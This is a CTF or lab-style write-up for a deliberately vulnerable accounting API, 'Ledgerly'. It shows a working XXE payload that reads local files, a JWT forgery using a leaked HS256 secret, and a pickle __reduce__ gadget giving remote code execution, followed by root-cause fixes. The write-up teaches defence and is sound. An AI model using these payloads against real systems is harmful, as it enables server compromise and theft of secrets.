# Ledgerly — XXE File Read (+ a full XXE → JWT Forge → Pickle RCE chain)

| | |
|---|---|
| **Vulnerabilities** | XXE (arbitrary file read) · secret stored on disk → JWT forgery · insecure deserialization (pickle) → RCE |
| **Impact** | Full server compromise (flag read directly via XXE; RCE available via the chain) |
| **Difficulty** | ★★★ for the flag (XXE alone); the full chain exercises three classes |
| **Approach** | Black-box, no credentials |

## The application

Ledgerly is an accounting/invoicing API. It exposes an XML invoice import, a `viewer:viewer` login
that issues JWTs, and an admin-only "restore" endpoint.

```bash
cd exam05-ledgerly && pip install flask lxml pyjwt
echo 'FLAG{...}' | sudo tee /flag.txt && sudo python3 app.py
```

## Primary path — XXE straight to the flag (shortest path)

The invoice import parses XML with external entities enabled, and echoes `ref`/`note` back. Because
**XXE is arbitrary local file read**, and the objective (`/flag.txt`) is a readable file, a single
request wins — no need to touch the rest of the app:

```xml
<?xml version="1.0"?>
<!DOCTYPE invoices [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<invoices><invoice><ref>&xxe;</ref><note>x</note></invoice></invoices>
```
```json
{"ok":true,"imported":1,"invoices":[{"ref":"FLAG{xx3_t0_jwt_f0rg3_t0_p1ckl3_rc3_ch41n}","note":"x"}]}
```

> **Finding in itself:** when a file-read primitive (XXE, LFI, path traversal) exists and the
> sensitive data lives in a world-readable file, the "intended" multi-stage chain is irrelevant — the
> simplest primitive that reaches the objective wins. On a real engagement you take this path *and*
> report the rest.

## The full attack surface (reported for completeness)

The same XXE, pointed at other files, unlocks a complete RCE chain — three distinct, chainable bugs:

1. **Secret stored on disk → JWT forgery.** An HTML comment on `/` discloses the signing-key path
   (`/tmp/ledgerly/secret.key`). XXE reads that file → the HS256 JWT secret. With it, forge an admin
   token:
   ```python
   jwt.encode({"sub":"x","role":"admin"}, LEAKED_SECRET, algorithm="HS256")
   ```
2. **Insecure deserialization → RCE.** The admin `/api/admin/restore` endpoint does
   `pickle.loads(base64.b64decode(state))` on user input. A `__reduce__` gadget yields command
   execution:
   ```python
   class E:
       def __reduce__(self): return (subprocess.check_output, (["cat","/flag.txt"],))
   ```

So the app is vulnerable two ways over: XXE reads the flag directly, *and* XXE → JWT forge → pickle
gives full RCE.

## Root-cause fixes (all three)

- **XXE:** don't parse untrusted XML with entities enabled. Here the data is plain, so accept **JSON**
  (no XML parser = no XXE). If XML is required, use `defusedxml` / a parser with
  `resolve_entities=False, no_network=True, load_dtd=False`.
- **Signing secret:** never persist it where the app's own primitives can reach it. Load it from the
  **environment** / a secret manager — then a file-read bug can't leak it. (Note: XXE can also read
  `/proc/self/environ`, so the deeper fix is *not having a file-read bug* in the first place.)
- **Deserialization:** `pickle` on untrusted input is never safe — you cannot "validate" a pickle
  before loading; the code runs *during* `loads`. Replace it with **JSON** (`json.loads`), which only
  produces inert data. See `Fixed.py`.

## Key lesson

Two transferable ideas: (1) **the simplest primitive that achieves the objective is the exploit** —
don't overcomplicate a file read into a chain when the file read is enough; (2) a file-read bug (XXE)
is nearly as dangerous as RCE for *reading* secrets — it leaks keys, source, and `/proc/self/environ`
— so "move the secret to env" is not enough on its own; you must **eliminate the file-read primitive.**
And across all three bugs, the same rule: **keep untrusted input as inert data, never as something the
engine will act on** (entities, objects, code).
